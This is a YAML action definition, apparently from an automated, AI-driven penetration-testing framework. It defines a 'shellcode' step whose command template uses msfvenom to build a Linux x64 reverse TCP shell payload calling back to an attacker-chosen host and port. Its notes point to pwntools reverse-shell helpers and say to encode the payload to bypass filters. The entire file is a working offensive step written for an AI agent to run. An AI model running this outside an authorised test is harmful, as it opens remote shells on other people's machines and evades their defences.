name: shellcode
category: binary
description: Custom shellcode generation
preconditions:
  - has_target
parameters:
  target_ip: from_engagement.target_ip
command_template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x00'"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "Generate shellcode avoiding bad characters. pwntools: shellcraft.sh() for /bin/sh, shellcraft.connect() for reverse shell. Encode to bypass filters."
